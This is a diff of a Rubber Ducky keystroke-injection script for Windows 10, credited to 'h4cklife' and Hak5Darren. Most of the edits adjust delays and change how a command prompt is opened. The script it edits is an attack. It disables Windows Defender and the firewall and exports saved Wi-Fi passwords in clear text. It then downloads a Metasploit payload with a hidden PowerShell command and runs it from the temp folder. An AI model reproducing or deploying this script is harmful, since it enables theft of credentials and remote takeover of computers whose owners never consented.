@@ -4,7 +4,9 @@ REM Target: Windows 10 Extended Author: h4cklife Original Author: Hak5Darren
 REM
 REM DISABLE WINDOWS DEFENDER
 REM
-DELAY 1000
+DELAY 1500
+ESCAPE
+DELAY 200
 GUI r
 DELAY 200
 STRING powershell Start-Process powershell -Verb runAs
@@ -20,32 +22,33 @@ ENTER
 REM
 REM EXPORT WIFI PASSWORDS
 REM
-DELAY 1000
+DELAY 2000
 ESCAPE
-CONTROL ESCAPE
-DELAY 400
-STRING cmd
-DELAY 400
+DELAY 500
+GUI r
+DELAY 300
+STRING cmd.exe
+DELAY 500
 CTRL-SHIFT ENTER
-DELAY 400
+DELAY 500
 TAB
-DELAY 100
+DELAY 200
 TAB
-DELAY 100
+DELAY 200
 ENTER
-DELAY 400
+DELAY 500
 STRING netsh firewall set opmode mode=disable
 ENTER
-DELAY 400
+DELAY 500
 STRING mkdir %USERPROFILE%\wprofiles
 ENTER
-DELAY 400
+DELAY 500
 STRING cd %USERPROFILE%\wprofiles
 ENTER
-DELAY 400
+DELAY 500
 STRING netsh wlan export profile key=clear
 ENTER
-DELAY 400
+DELAY 500
 STRING exit
 ENTER
 
@@ -53,7 +56,7 @@ REM
 REM MSF PAYLOAD
 REM
 DELAY 500
-GUI R
+GUI r
 DELAY 200
 STRING powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('{0}', '%TEMP%\{1}'); Start-Process "%TEMP%\{1}"
 ENTER
